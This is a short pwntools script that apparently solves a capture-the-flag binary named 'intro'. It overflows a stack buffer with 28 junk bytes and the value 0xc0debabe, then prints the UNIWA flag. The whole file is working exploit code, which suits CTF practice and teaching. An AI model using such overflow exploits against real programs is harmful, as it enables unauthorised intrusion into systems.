#!/usr/bin/python3
from pwn import *

ip = 'some_ip' # change this
port = 6969 # change this
fname = './intro'

LOCAL = True

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	junk = b'i'*28
	payload = junk + p64(0xc0debabe)
	sla('>', payload)
	ru('{')[:-1]
	flag = ru('}')
	print('Flag: UNIWA{' + flag.decode())

if __name__ == '__main__':
	pwn()